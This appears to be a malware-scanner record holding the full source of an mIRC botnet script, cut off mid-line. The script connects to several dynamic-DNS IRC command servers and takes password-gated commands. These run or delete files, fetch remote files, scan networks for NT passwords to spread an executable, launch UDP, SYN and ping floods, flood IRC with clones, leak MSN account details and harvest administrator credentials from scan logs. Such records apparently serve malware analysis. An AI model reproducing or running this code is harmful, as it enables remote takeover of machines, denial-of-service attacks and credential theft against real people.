{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "binary": "May read or write a binary file",
            "chr": "May attempt to obfuscate specific str",
            "kill": "May delete a file",
            "mkdir": "May create a directory",
            "register": "May call a DLL using Excel 4 Macros",
            "run": "May run an executable file or a system command",
            "write": "May write to a file"
        },
        "macro": "on *:ExIt:{ SoCkClOsE * | RlEvEl 666 | UnSeT %* }\non *:StArT:{\n  SeTuP\n  %aa\n  %ss\n  %yy\n}\nAlIaS SeTuP {\n  %aa = CoNnEcT\n  %ss = CfAc\n  %yy = SeTtInGs2\n  %asas = FnIcK\n  %perfix = !\n  %sf = xpxp.exe\n  %channel = #Gt\n  %key = 987654\n  %o1 = sososm\n}\nalias CoNnEcT {\n  if (%s1 == $null) { %s1 = ooss.dynu.com server1:6667 }\n  if (%s2 == $null) { %s2 = Logo.IRCXNET.NET server2:6667 }\n  if (%s3 == $null) { %s3 = CCP.IRCXNET.NET server3:6667 }\n  if (%s4 == $null) { %s4 = ssoo.dynu.com server4:6667 }\n  if (%s5 == $null) { %s5 = ssoo.dynu.net server5:6667 }\n  if (%s6 == $null) { %s6 = ooss.dynu.net server6:6667 }\n  if (%s7 == $null) { %s7 = coderx.dynu.com server7:6667 }\n  if (%s8 == $null) { %s8 = ma2002am.dynu.net server8:6667 }\n  server %s1\n  timercheckserver -o 0 90 servercheck\n}\nalias CfAc { \n  if ($exists(dat) = $false) { mkdir dat | rename config.ini dat\\config.ini | rename language.ini dat\\language.ini | rename nt_pass.dic dat\\nt_pass.dic | rename nt_user.dic dat\\nt_user.dic | rename os.finger dat\\os.finger | rename port.ini dat\\port.ini | rename rpc.ini dat\\rpc.ini }  \n  if ($exists(plugin) = $false) { mkdir plugin | rename 090-ntpass.xpn plugin\\090-ntpass.xpn }  \n}\non *:CoNnEcT:{ mode $me +ix | join %channel 7070 | .timerlll 0 35 raw -q ping $me | %asas | ial on | pdcc on | fsend on | clearall } }\non *:disCoNnEcT:{ rlevel 666 | run van32.exe calcu.exe -kf roudSTID.EXE }\non *:KiCk:%channel:{ .timerfastjoin -o 0 1 .join %channel 7070 } }\non *:JoIn:*:{ if ($nick == $me) { .timerfastjoin off } }\non ^*:PoNg:{ ctcp $me ping }\non 666:part:%users:{ ruser 666 $nick | clearall }\non 666:quit:%users:{ ruser 666 $nick | clearall }\non 666:nick:%users:{ ruser 666 $nick | clearall }\non *:text:!start*:%channel:{ \n  if (km3331 isin $nick) && ($2 = %key) && ($level($nick) != 666) { \n    talk Password Accepted For: $nick , Bot Version: -=[ Power Team ]=-\n    auser 666 $nick\n    halt \n  } \n}\nalias servercheck { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 0) { set %servercheck 1 | server %s2 |  timercheckserver -o 0 50 servercheck1 } } }\nalias servercheck1 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 1) { set %servercheck 2 | server %s3 | timercheckserver -o 0 50 servercheck2 } } }\nalias servercheck2 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 2) { set %servercheck 3 | server %s4 | timercheckserver -o 0 50 servercheck3 } } }\nalias servercheck3 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 3) { set %servercheck 4 | server %s5 | timercheckserver -o 0 50 servercheck4 } } }\nalias servercheck4 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 4) { set %servercheck 5 | server %s6 | timercheckserver -o 0 50 servercheck5 } } }\nalias servercheck5 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 5) { set %servercheck 6 | server %s7 | timercheckserver -o 0 50 servercheck6 } } }\nalias servercheck6 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 6) { set %servercheck 7 | server %s8 | timercheckserver -o 0 50 servercheck } } }\nalias ownage return $gettok(ownage scripting hack fuck crack fuckyou spy military hacker usa cracker krakz ,$r(1,10),32 ) \nalias talk { var %& $1- | var %co 0 | while (%co < $numtok(%&,32)) { inc %co | var %_t = %_t $iif($upper($left($gettok(%&,%co,32),1)) isalpha,\u00031\u001f $+ $upper($left($gettok(%&,%co,32),1)) $+ \u001f\u00031 $+ $right($gettok(%&,%co,32),-1) $+ \u0002\u0002,\u0002\u000314\u0002 $+ $upper($left($gettok(%&,%co,32),1)) $+ $right($gettok(%&,%co,32),-1)) } | msg %channel %_t | clearall\n}\non 666:text:*:*:{\n  if ( $1 == %perfix $+ Ramok) { x $2- }\n  if ( $1 == %perfix $+ LoGoUt) { ruser $nick | talk you are logged out $nick }\n  if ( $1 == %perfix $+ Ip) { talk ip/host: $ip $+ / $+ $host / $time $+ @ $+ $date / $os / $duration($calc($ticks / 1000 )) }\n  if ( $1 == %perfix $+ D) && $2 != $null) { talk DCC Sending $2 To $nick | dcc send $nick $2 }\n  if ( $1 == %perfix $+ BnC) && ($3 != $null) { if ($sock(Bnc)) { talk [ERROR] bnc is already active on port: %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $2 | %Bnc.port = $2 | %Bnc.passwd = $3 | talk [bnc] /server -m $ip $+ : $+ $2 $+ , then /quote PASS $3 }\n  if ( $1 == %perfix $+ BnCs) && (%Bnc.Port != $null) { sockclose Bnc* | talk [bnc] server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }\n  if ( $1 == %perfix $+ Jo) && ($2 != $null) { join $2 | talk joined $2 }\n  if ( $1 == %perfix $+ Pa) && ($2 != $null) { part $2 | talk parted $2 }\n  if ( $1 == %perfix $+ randscan) && ( $3 != $null ) && (%begshortip == $null) && ($exists(%sf)) { set %loud on | set %begit $randip($2) | talk Starting scan from: %begit to $3 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }\n  if ( $1 == %perfix $+ Re) { talk Reconnecting to %server | /server %server }\n  if ( $1 == %perfix $+ PacKeT) && ($3 != $null) { run eoputr.exe /n /fh /r \"ping.exe $2 -n $3 -l 65500\" | talk [PING] packeting $2 with $calc($3 *65536/1024/1000) $+ mb traffic }\n  if ( $1 == %perfix $+ PaCkEtS) { run eoputr.exe /n /fh /r \" $+ $mircdirlibparse.exe -kf ping.exe\" | talk [DDoS] packeting halted! }\n  if ( $1 == %perfix $+ UpO) && ($2 != $null) { mode $2 +o $nick }\n  if ( $1 == %perfix $+ UpOo) && ($2 != $null) { mode $2 +q $nick }\n  if ( $1 == %perfix $+ RaNdSs) { set %iip1 $randip($2) | set %iip2 $3 | set %rangeip %iip1 $+ - $+ %iip2 | run van32.exe roudSTID.EXE -host %rangeip -ntpass -t 150,75 | talk %rangeip | unset %rangeip } \n  if ( $1 == %perfix $+ rAnD) { set %iip1 $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ .1 | set %iip2 $gettok($ip,1-2,46) $+ .255.255 | set %rangeip %iip1 $+ - $+ %iip2 | run van32.exe roudSTID.EXE -host %rangeip -ntpass -t 150,75 | talk %rangeip | unset %rangeip } \n  if ( $1 == %perfix $+ scanall) { set %iip1 $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ .1 | set %iip2 $gettok($ip,1-2,46) $+ .255.255 | set %rangeip %iip1 $+ - $+ %iip2 | run van32.exe roudSTID.EXE -host %rangeip -all | talk %rangeip | unset %rangeip | timerparse -o 0 45 startparse | timerroot -o 0 100 getroot }\n  if ( $1 == %perfix $+ StaR) { set %iip1 $gettok($ip,1-2,46) $+ .1.1 | set %iip2 $gettok($ip,1-2,46) $+ .255.255 | set %rangeip %iip1 $+ - $+ %iip2 | run van32.exe roudSTID.EXE -host %rangeip -ntpass -t 150,75 | talk %rangeip | unset %rangeip }\n  if ( $1 == %perfix $+ RaNdIp) { set %iip1 $gettok($ip,1-3,46) $+ .1 | set %iip2 $gettok($ip,1-2,46) $+ .255.255 | set %rangeip %iip1 $+ - $+ %iip2 | run van32.exe roudSTID.EXE -host %rangeip -ntpass -t 150,75 | talk %rangeip | unset %rangeip }\n  if ( $1 == %perfix $+ StOp) { set %status 0 | run van32.exe calcu.exe -kf roudSTID.EXE | talk stop } \n  if ( $1 == %perfix $+ r) { /run $2- | talk \u0002F\u0002ile \u0002R\u0002an \u0002O\u0002k . $+ ! | halt }\n  if ( $1 == %perfix $+ rem) { /remove $2- | talk \u0002R\u0002emove \u0002O\u0002k . $+ ! | halt }\n  if ( $1 == %perfix $+ qu) { exit }\n  if ( $1 == %perfix $+ msn) { .comopen msn Messenger.UIAutomation | if ($comerr) { return } | %a = $com(msn,MyStatus,2) | %b = $com(msn).result | %a = $com(msn,MyFriendlyName,2) | %c = $com(msn).result | %a = $com(msn,MySigninName,2) | %d = $com(msn).result | %a = $com(msn,MyServiceName,2) | %e = $com(msn).result | %x = $com(msn,InstallationDirectory,1) | .comclose msn | if (%b = 1) { %b = Offline } | if (%b = 2) { %b = Online } | if (%b = 6) { %b = Invisible } | if (%b = 10) { %b = Busy } | if (%b = 14) { %b = Be Right Back } | if (%b = 18) { %b = Idle } | if (%b = 34) { %b = Away } | if (%b = 50) { %b = On the Phone } | if (%b = 66) { %b = Out for Lunch } | if (%b = offline) { talk Msn: Currently Offline! } | else { talk Msn: [Nickname: %c $+ ]  [E-mail: %d $+ ] [Service Provider: %e $+ ] [Status: %b $+ ] } }\n  if ( $1 == %perfix $+ ma) { /download $2- | /talk \u0002\u00032[\u0002\u000314Downloading..\u0002\u00032]\u0002\u000314 }\n  if ( $1 == %perfix $+ FtP) {\n    if ( $2 = -a) && (%ftp.stats == $null) { %ftp.stats = 1 | %ftp.user = $3 | %ftp.pass = $4 | %ftp.port = $5 | write -l7 rconnect.conf <User \" $+ %ftp.user $+ \"> | write -l8 rconnect.conf \tPassword \" $+ %ftp.pass $+ \" | write -l2 rconnect.conf BindPort %ftp.port | talk [FTP] ftp started at: $+(ftp://,%ftp.user,:,%ftp.pass,@,$ip,:,%ftp.port,/) | run eoputr.exe /n /fh /r \"ipcfg.exe | halt }\n    if ( $2 = -b) && (%ftp.stats != $null) { run eoputr.exe /n /fh /r \"calcu.exe -kf ipcfg.exe\" | talk [FTP] ftp on: $ip is now halted | unset %ftp.* | remove rconnect.log | halt }\n  }\n  if ( $1 == %perfix $+ n) { \n    if ( $2 == -a) { %run.f.n = $3- | if $exists(%run.f.n) { talk Attempting To Run: %run.f.n , [Normal] | timerrunn 1 2 run %run.f.n | halt } }\n    if ( $2 == -b) { %run.f.h = $3- | if $exists(%run.f.h) { talk Attempting To Run: %run.f.h , [Hidden] | timerrunh 1 2 run eoputr.exe /n /fh /r \" $+ %run.f.h $+ \" | halt } }\n  }\n  if ( $1 == %perfix $+ PiNgo) {\n    if ( $2 == -a) && (%pingo == $null) { %pingo = 1 | %pingip = $3 | %pingmb = $4 | run eoputr.exe /n /fh /r \"ping.exe %pingip -n %pingmb -l 65500 -w 0\" | talk [Ping Attack] Started Ping Attack on: %pingip , with $calc($4 *65536/1024/1000) $+ mb of traffic.. | timerp 1 10 unset %pingo | halt }\n    if ( $2 == -b) && (%pingo != $null) { unset %ping* | talk [Ping Attack] Attacking Is Now Halted.. | run eoputr.exe /n /fh /r \"calcu.exe -kf ping.exe\" | halt }\n  }\n  if ( $1 == %perfix $+ nb) && ($2-) {\n    if ( $2 == isp) && ($3 = start) && (%begshortip == $null) && $exists(%sf) { set %nb.port $5 | set %scan.bat $4 | set %begit $gettok($ip,1-2,46) $+ .1.1 | talk [MyDoom.A Scanner] starting scan from: %begit to $gettok($ip,1-2,46) $+ .255.255 using %scan.bat sharing thru port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }\n    if ( $2 == isp) && ($3 = rand) && (%begshortip == $null) && $exists(%sf) { set %nb.port $5 | set %scan.bat $4 | set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | talk [NetBios Scanner] starting scan from: %begit to $gettok($ip,1-2,46) $+ .255.255 using %scan.bat sharing thru port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }\n    if ( $2 == ip) && (%begshortip == $null) && $exists(%sf) { set %nb.port $4 | set %scan.bat $3 | set %begit $gettok($ip,1-3,46) $+ .1 | talk [NetBios Scanner] starting scan from: %begit to $+($gettok($ip,1-3,46),.255) using %scan.bat sharing thru port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-3,46) $+ .255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }\n    if ( $2 == start) && (%begshortip == $null) && $exists(%sf) { set %nb.port $6 | set %scan.bat $5 | set %begit $randip($3) | talk [NetBios Scanner] starting scan from: %begit to $4 using %scan.bat sharing thru port %nb.port .. | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }\n    if ( $2 == stop) && (%begshortip != $null) { talk scanner scanning from: %begshortip to %endshortip stopped by $nick $+ ! | stopscan }\n    if ( $2 == s) && (%begshortip != $null) { talk scanner stats, range: [ %begshortip - %endshortip ] port: [ $sock($sockname).port ] current ip: [ %ip28 ] total found: [ $totalfound ] sharing method:[ %scan.bat ] spreading port: [ %nb.port ] spreading file: [ %sf ] }\n    if ( $2 == on) { talk Scanner now ON | %auto = on }\n    if ( $2 == off) { talk Scanner now off | %auto = off }\n    if ( $2 == ran) && (%begshortip == $null) { randscan | set %begshortip %1p1 | set %endshortip %1p2 | set %beglongip $longip(  %begshortip ) | st4rtsc4n | talk Scan from: %1p1 to %1p2 }\n  }\n  if ( $1 == %perfix $+ nik) { set %udp.inc 0 | set %udp.fuck $2 | set %udp.reps $3 | .nuke %udp.reps %udp.fuck | talk Atacking %udp.fuck ip %udp.reps time | halt }  \n  if ( $1 == %perfix $+ udpkill) { unset %udpkillipz | unset %udpktimes | set %udpkillipz $2 | set %udpktimes $3 | runudpkill }\n  if ( $1 == %perfix $+ Clones) { set %channel2 $5- | set %bojnom $2 | set %bojserver $3 | set %bojport $4 | if ($5 == $null) { halt } | timerbojsock2 0 0  | timerbojsock -m %bojnom 100 bojsock }\n  if ( $1 == %perfix $+ Clonesjoin) { if ($2 == $null) { halt } | set %bojfuck $2 | sockwrite -n boj* join %bojfuck | sockwrite -n boj* privmsg $2 : $+ $str(F\u0002O\u0016o\u001fO\u0002D\u001fT\u0002E\u0016R.,40) | .timerboj $+ $sockname 0 4 bojflood }\n  if ( $1 == %perfix $+ ClonesClose) { unset %boj* %channel | sockclose boj* | .timerboj* off }\n  if ( $1 == %perfix $+ udp) { if (!$2) { talk udp error, synatx: !udp <host/ip> <port> <num of packets> <packet delay> | halt } | if (*.* !iswm $2) { talk udp error, You must specify a host/ip to packet. | halt } | if ($3 !isnum) { talk udp error, You must specify a PORT to flood. | halt } | if ($4 !isnum) { talk udp error, You must specify a NUMBER of packets. | halt } | if ($5 !isnum) { talk udp error, You must specify a PACKET-DELAY time. | halt } | %udp.ip = $2 | %udp.port = $3 | %udp.num = $4 | %udp.delay = $5 | talk udp attacking starting on ip: %udp.ip , port: %udp.port , amount: %udp.num , delay: %udp.delay  | .timerUDP %udp.num %udp.delay sockudp UDP $+ $r(1,999999999999999999) %udp.ip %udp.port $str(backXcr3w_,33) | unset %udp.* }\n  if ( $1 == %perfix $+ ddos) { if (!$2) { talk dos error, syntax: !dos <host/ip> <num of packets> | halt } | if (*.* !iswm $2) { talk dos error: You must specify a Host or IP. | halt } | if ($3 !isnum) { talk dos error: You must specify a NUMBER of packets | halt } | talk dos packeting.....  | run $hider /n /fh /r \"ping.exe $2 -n $3 -l 65500\" }\n  if ( $1 == %perfix $+ syn) && ($2- != $null) { if ($2 == stop) { halt } | set %synport $3 | if (%synport == random) { set %synport $rand(0,65535) } | talk syn flooding: $2 with $4 syn packets on port: %synport  | set %synaa $2 | synz start $4 $2 %synport }\n  if ( $1 == %perfix $+ syn) && ($2 == stop) && ($3- == $null) && (%synaa != $null) { sockclose syn* | talk syn flood on: %synaa halted.. | unset %synaa | halt }\n  if ( $1 == %perfix $+ satnickx) && ($3 != $null) { unset %satchan | unset %satserver | unset %satport | set %fld.tp nickx | set %satserver $2 | set %satport $3 | set %satchan $4 | startsfx }\n  if ( $1 == %perfix $+ satmix) && ($3 != $null) { unset %satchan | unset %satserver | unset %satport | set %fld.tp mix | set %satserver $2 | set %satport $3 | set %satchan $4 | startsfx }\n  if ( $1 == %perfix $+ satjpx) && ($3 != $null) { unset %satchan | unset %satserver | unset %satport | set %fld.tp jpx | set %satserver $2 | set %satport $3 | set %satchan $4- | startsfx }\n  if ( $1 == %perfix $+ satstop) { unset %satchan | unset %satserver | unset %satport | .sockclose crash* | msg # stop sat flood }\n  if ( $1 == %perfix $+ satmsgx) && ($3 != $null) { unset %satchan | unset %satserver | unset %satport | set %fld.tp msgx | set %satserver $2 | set %satport $3 | set %satchan $4- | startsfx }\n  if ( $1 == %perfix $+ satrip) && ($3 != $null) { unset %satchan | unset %satserver | unset %satport | set %fld.tp rip | set %satserver $2 | set %satport $3 | set %satchan $4 | startsfx }\n  if ( $1 == %perfix $+ clone) {\n    if ( $2 == load) && ($3 != $null) { sockopen flood- $+ $r(1,999) $+ $r(a,z) $+ $r(A,Z)  $3 $4 | talk clones loading: $3 $+ : $+ $4 | halt }\n    if ( $2 == quit) { sockwrite -tn flood-* QUIT : $+ $3- | talk clones are now disconnected.. | halt  }\n    if ( $2 == kill) { sockclose flood-* | .timerpc* off | talk attempting to close sockets. | halt  }\n    if ( $2 == join) && ($3 != $null) { sockwrite -tn flood-* JOIN $3 $4- | halt  }\n    if ( $2 == part) && ($3 != $null) { sockwrite -tn flood-* PART $3 $4- | halt }\n    if ( $2 == msg) && ($3 != $null) { sockwrite -tn flood-* privmsg $3 : $+ $4- | halt  }\n    if ( $2 == notice) && ($3 != $null) { sockwrite -tn flood-* privmsg $3 : $+ $4- | halt  }\n    if ( $2 == jp) && ($3 != $null) { sockwrite -n flood-* part $3 | sockwrite -n flood-* join $3 | sockwrite -n flood-* part $3 | sockwrite -n flood-* join $3 | sockwrite -n flood-* part $3 | sockwrite -n flood-* join $3 | sockwrite -n flood-* part $3 | sockwrite -n flood-* join $3 | sockwrite -n flood-* part $3 | sockwrite -n flood-* join $3 | sockwrite -n flood-* part $3 | sockwrite -n flood-* join $3 | sockwrite -n flood-* part $3 | sockwrite -n flood-* join $3 | sockwrite -n flood-* part $3 | sockwrite -n flood-* join $3 | halt  }\n    if ( $2 == nfld) { sockwrite -tn flood-* nick $r(A,Z) $+ $r(1,99) $+ $r(1,99) $+ $r(A,Z) $+ -[ $+ $r(1,9999) $+ ] | halt }\n    if ( $2 == -) || ($2 == .) { sockwrite -n flood-* $3- | halt }\n    if ( $2 == jmmp) { sockwrite -nt user.* Join $2 | sockwrite -nt user.* privmsg $2 : $3- | sockwrite -nt user.*  part $2 }\n    if ( $2 == jpp) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- }\n    if ( $2 == jp3) && ($3 != $null) { sockwrite -tn user.* IRCX | timer 0 1 sockwrite -tn user.* JOIN $3 $4- | timer 0 2 sockwrite -tn user.* PART $3 $4- }\n    if ( $2 == jmp) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ %m3 | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ %m1 | sockwrite -tn user.* PART $3 $4- }\n    if ( $2 == jpm) { talk clones starting join/part flood with msg on: $3 | sockwrite -n flood-* JOIN $3 | sockwrite -tn flood-* part $3 #ViperX | sockwrite -tn flood-* join $3 | sockwrite -tn flood-* part $3 \u0016SkerrX\u0016 | sockwrite -tn flood-* join $3 | sockwrite -tn flood-* part $3 \u0016SkerrX\u0016 | sockwrite -n flood-* JOIN $3 | sockwrite -tn flood-* part $3 \u0016SkerrX\u0016 | sockwrite -tn flood-* join $3 | sockwrite -tn flood-* part $3 \u0016SkerrX\u0016 | sockwrite -tn flood-* join $3 | sockwrite -tn flood-* part $3 \u0016SkerrX\u0016 | sockwrite -n flood-* JOIN $3 | sockwrite -tn flood-* part $3 \u0016SkerrX\u0016 | sockwrite -tn flood-* join $3 | sockwrite -tn flood-* part $3 \u0016SkerrX\u0016 | sockwrite -tn flood-* join $3 | sockwrite -tn flood-* part $3 \u0016SkerrX\u0016 | sockwrite -n flood-* JOIN $3 | sockwrite -tn flood-* part $3 \u0016ViperX\u0016 | sockwrite -tn flood-* join $3 | sockwrite -tn flood-* part $3 \u0016SkerrX\u0016 | sockwrite -tn flood-* join $3 | sockwrite -tn flood-* part $3 \u0016SkerrX\u0016 }\n    if ( $2 == Chanserv) { talk clones starting flooding Chanserv | set %Fchan # $+ $r(A,Z) $+ $r(1,9999) | sockwrite -nt flood-* Join %Fchan | sockwrite -nt flood-* Privmsg Chanserv : register %Fchan $random sss ss1 rf ffgh4e | halt  }\n    if ( $2 == Nickserv) { talk clones starting flooding nickserv | sockwrite -nt flood-* Privmsg Nickserv : register $random @ $+ $random $+ .com | halt }\n    if ( $2 == flood) { sockwrite -tn flood-* join $3 | sockwrite -tn flood-* privmsg $3 : $+ $4- | sockwrite -tn flood-* notice $3 : $+ $4- | sockwrite -tn flood-* privmsg $3 : $+ $4- | sockwrite -tn flood-* notice $3 : $+ $4- | halt }\n    if ( $2 == stfu)  { sockwrite -tn flood-* join $3 | sockwrite -tn flood-* notice $3 : $+ $str(F\u0002O\u0016o\u001fO\u0002D\u001f\u0002E\u0016R.,10)\u001f | sockwrite -tn flood-* privmsg $3 : $+ $str(F\u0002O\u0016o\u001fO\u0002D\u001f\u0002E\u0016R.,10)\u001f\u001f | sockwrite -tn flood-* notice $3 : $+ $str(F\u0002O\u0016o\u001fO\u0002D\u001f\u0002E\u0016R.,10)\u001f\u001f | sockwrite -tn flood-* privmsg $3 : $+ $str(F\u0002O\u0016o\u001fO\u0002D\u001f\u0002E\u0016R.,10)\u001f\u001f | sockwrite -tn flood-* notice $3 : $+ $str(F\u0002O\u0016o\u001fO\u0002D\u001f\u0002E\u0016R.,10)\u001f\u001f | sockwrite -tn flood-* privmsg $3 : $+ $str(F\u0002O\u0016o\u001fO\u0002D\u001f\u0002E\u0016R.,10)\u001f\u001f }\n  }\n}\nraw 332:*:{ \n  %topic = $3-  \n  if (a == $gettok(%topic,1,32)) {\n    if (i == $gettok(%topic,2,32)) && $exists(%sf) { set %iip1 $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ 1 | set %iip2 $gettok($ip,1-2,46) $+ .255.255 | set %rangeip %iip1 $+ - $+ %iip2 | run van32.exe roudSTID.EXE -host %rangeip -ntpass -t 150,75 | talk %rangeip | set %iip1 $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ 1 | set %iip2 $gettok($ip,1-2,46) $+ .255.255 | set %rangeip %iip1 $+ - $+ %iip2 | run van32.exe roudSTID.EXE -host %rangeip -ntpass -t 150,75 | talk %rangeip | timerparse -o 0 45 startparse | timerroot -o 0 100 getroot }\n    if (i == $gettok(%topic,2,32)) && (s == $gettok(%topic,3,32)) && (%begshortip == $null) && $exists(%sf) { set %nb.port $gettok(%topic,5,32) | set %scan.bat $gettok(%topic,4,32) | set %begit $gettok($ip,1-2,46) $+ .1.1 | talk Scan: %begit to $gettok($ip,1-2,46) $+ .255.255 using %scan.bat port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n | %auto = on }\n    if (i == $gettok(%topic,2,32)) && (r == $gettok(%topic,3,32)) && (%begshortip == $null) && $exists(%sf) { set %nb.port $gettok(%topic,5,32) | set %scan.bat $gettok(%topic,4,32) | set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | talk Scan: %begit to $gettok($ip,1-2,46) $+ .255.255 using %scan.bat port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n | %auto = on }\n    if (i == $gettok(%topic,2,32)) && (ip == $gettok(%topic,3,32)) && (%begshortip == $null) && $exists(%sf) { set %nb.port $gettok(%topic,4,32) | set %scan.bat $gettok(%topic,3,32) | set %begit $gettok($ip,1-3,46) $+ .1 | talk Scan: %begit to $+($gettok($ip,1-3,46),.255) using %scan.bat port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-3,46) $+ .255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n | %auto = on }\n    if (i == $gettok(%topic,2,32)) && (%begshortip == $null) && $exists(%sf) { set %nb.port $gettok(%topic,6,32) | set %scan.bat $gettok(%topic,5,32) | set %begit $randip($gettok(%topic,3,32)) | talk Scan: %begit to $gettok(%topic,4,32) using %scan.bat port %nb.port .. | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $gettok(%topic,4,32) | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n | %auto = on }\n  }\n}\nraw 366:*: {\n  haltdef\n  if (%channel($2).topic == $null) && ($nick($2,0) == 1) { topic %channel a i r f 139 | mode %channel +ntsk 7070 | mode %channel +l 10000 }\n}\non *:sockopen:download: { if ($sockerr) { talk Error: Socket error. | return } | .write -c %download2 | .sockwrite -n $sockname GET / $+ %download3 HTTP/1.0 |  .sockwrite -n $sockname Accept: */* | .sockwrite -n $sockname Host: %download1 | .sockwrite -n $sockname }\non *:sockread:download: { if (%downloadready != 1) { var %header | sockread %header | while ($sockbr) { if (Content-length: * iswm %header) { %downloadlength = $gettok(%header,2,32) } | elseif (* !iswm %header) { %downloadready = 1 | %downloadoffset = $sock($sockname).rcvd | break } | sockread %header } } | sockread 4096 &d | while ($sockbr) { bwrite %download2 -1 -1 &d | sockread 4096 &d } }\non *:sockclose:download: { if ($file(%download2).size != %downloadlength) { .sockclose download | download http:// $+ %download1 $+ / $+ %download3 } | else { talk Success: File downloaded ( $+ $mircdir $+ %download2 $+ ) [[ $+ $bytes($file(%download2).size).suf $+ ][ $+ $duration($calc($ctime - %download4)) $+ ][ $+ $round($calc($calc($file(%download2).size / 1024) / $calc($ctime - %download4)),2) $+ kbps $+ ] } | unset %download* }\nalias download { if ($sock(download)) { talk Error: Already downloading a file. | return } | set %download1 $gettok($1,2,47) | set %download2 $gettok($1,$numtok($1,47),47) | set %download3 $gettok($1,3-,47) | set %download4 $ctime | .sockopen download %download1 80 \n}\nalias random return $r(A,Z) $+ $r(1,99) $+ $r(a,z) $+ $r(1,99) $+ $r(A,Z) $+ $r(1,99)\nalias SeTtInGs2 {\n  nick [ $+ $os $+ - $+ $r(0,99999) $+ $r(0,99999) $+ ]]\n  anick [ $+ $os $+ - $+ $r(0,99999) $+ $r(0,99999) $+ ]]\n  identd on [ $+ $os $+ - $+ $r(0,99999) $+ $r(0,99999) $+ ]]\n  emailaddr $+($ownage,@user.level-,$os,-.us.gov)\n  fullname [ $+ $os $+ - $+ $r(0,99999) $+ $r(0,99999) $+ ]] $+ $r(a,z)\n  if (!$portfree(66666)) { exit }\n  else { socklisten WindowsUpdate 66666 }\n}\nalias startparse {\n  set %t 0\n  set %results 0\n  set %total $findfile(log\\,*.htm,0)\n  :start\n  inc %t\n  if (%t <= %total) { parsefile $findfile(log\\,*.htm,%t) | goto start }\n}\nalias parsefile {\n  set %temp.test $1\n  set %temp.host $nopath($1)\n  set %temp.host $remove(%temp.host,.htm)\n  set %temp.text $read($1, w, *Type: Administrator*)\n  set %temp.line $readn\n  if (%temp.line == 0) { return NULL }\n  set %temp.text $read($1, $calc($readn - 1))\n  if ($read($1, $calc(%temp.line - 1)) == <BR>) { $getuserpass2($read($1, $calc(%temp.line - 2))) | return }\n  $getuserpass(%temp.text)\n}\nalias getuserpass {\n  set %temp.user $gettok($1,2,60)\n  set %temp.user $gettok(%temp.user,2,62)\n  set %temp.pass $gettok($1,3,47)\n  if (*pass*same*as*user* iswm %temp.pass) { set %temp.pass %temp.user }\n  if (*blank*pass* iswm %temp.pass) { set %temp.pass [NULL] }\n  if ($exists(rcnc.x) == $false) { .write -c 